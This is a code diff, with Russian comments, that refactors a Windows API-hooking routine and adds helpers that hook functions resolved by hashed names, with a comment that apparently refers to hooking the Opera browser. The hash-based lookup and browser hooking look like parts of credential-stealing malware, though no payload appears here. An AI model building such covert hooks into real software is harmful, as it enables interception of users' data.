@@ -107,7 +107,7 @@ PVOID HookApi( DWORD Dll, DWORD FuncHash, DWORD ReplacementFunc )
 // изменено при добавлении оперы(на сколько я понял), вынесено обращение к библиотеке, чтобы потом добавить смецение с целью вызова не экспортируемых функций
 /************************************************************************/
 
-PVOID __HookApi( DWORD Dll, DWORD FuncAddr, DWORD ReplacementFunc )
+PVOID __HookApi(DWORD FuncAddr, DWORD ReplacementFunc )
 {
 	FARPROC pFunc;
 	PVOID pvMem = 0;
@@ -162,6 +162,47 @@ PVOID __HookApi( DWORD Dll, DWORD FuncAddr, DWORD ReplacementFunc )
 }
 
 
+//--------------------------------------------------------
+// HookFunction
+// Функция устанавливает хук на указанную функцию
+//
+// FunctionAddr - адрес функции, которую необходимо 
+//                подменить
+// NewFunctionAddr - адрес новой функции
+// OriginalFunctionAddr - указатель на переменную, куда
+// будет записан адрес сохранённой, оригинальной, функции
+//--------------------------------------------------------
+bool HookFunction(LPVOID FunctionAddr, LPVOID NewFunctionAddr, LPVOID *OriginalFunctionAddr)
+{
+	LPVOID Original = NULL;
+
+	if (FunctionAddr && NewFunctionAddr)
+		Original = __HookApi((DWORD)FunctionAddr, (DWORD)NewFunctionAddr);
+	if (OriginalFunctionAddr)
+		*OriginalFunctionAddr = Original;
+
+	return Original != NULL;
+}
+
+
+
+//--------------------------------------------------------
+//  HookApiEx 
+//  Функция устанавливает хук на функцию
+// 
+//  DllNum           - Номер бибиотеки. см. GetApi.h
+//  FuncHash         - Хэш имени функции
+//  NewFunction      - Адрес новой функции
+//  OriginalFunction - Переменная, куда будет записан 
+//                     адрес оригинаьной функции
+//--------------------------------------------------------
+bool HookApiEx(DWORD DllNum, DWORD FuncHash, LPVOID NewFunction, LPVOID &OriginalFunction)
+{
+	DWORD FuncAddr = (DWORD)GetProcAddressEx(NULL, DllNum, FuncHash );
+	OriginalFunction = __HookApi(FuncAddr, (DWORD)NewFunction);
+	return OriginalFunction != NULL;
+}
+
 
 /************************************************************************/
 //* Перехватывает экспортируемую функцию из dll,                       *//
@@ -171,20 +212,20 @@ PVOID __HookApi( DWORD Dll, DWORD FuncAddr, DWORD ReplacementFunc )
 PVOID HookApi( DWORD Dll, DWORD FuncHash, LPVOID ReplacementFunc )
 {
 	DWORD FuncAddr = (DWORD)GetProcAddressEx(NULL, Dll, FuncHash );
-	return __HookApi(Dll, FuncAddr, (DWORD)ReplacementFunc);
+	return __HookApi(FuncAddr, (DWORD)ReplacementFunc);
 }
 
 PVOID HookApi( DWORD Dll, DWORD FuncHash, LPVOID ReplacementFunc, PVOID FuncReal )
 {
 	DWORD FuncAddr = (DWORD)GetProcAddressEx(NULL, Dll, FuncHash );
-	*((DWORD*)FuncReal) = (DWORD)__HookApi(Dll, FuncAddr, (DWORD)ReplacementFunc);
+	*((DWORD*)FuncReal) = (DWORD)__HookApi(FuncAddr, (DWORD)ReplacementFunc);
 	return *((PVOID*)FuncReal);
 }
 
 PVOID HookApi( const char* DllName, DWORD FuncHash, LPVOID ReplacementFunc, PVOID FuncReal )
 {
 	DWORD FuncAddr = (DWORD)GetProcAddressEx( (char*)DllName, 0, FuncHash );
-	*((DWORD*)FuncReal) = (DWORD)__HookApi(0, FuncAddr, (DWORD)ReplacementFunc);
+	*((DWORD*)FuncReal) = (DWORD)__HookApi(FuncAddr, (DWORD)ReplacementFunc);
 	return *((PVOID*)FuncReal);
 }
 
@@ -197,7 +238,7 @@ PVOID HookApi2( DWORD Dll, DWORD FuncVA, DWORD ReplacementFunc )
 	DWORD FuncAddr = (DWORD)GetProcAddressEx( NULL, Dll, 0 );
 	if (FuncAddr)
 	{
-		return __HookApi(Dll, FuncAddr + FuncVA, ReplacementFunc);
+		return __HookApi(FuncAddr + FuncVA, ReplacementFunc);
 	}
 	else
 		return NULL;
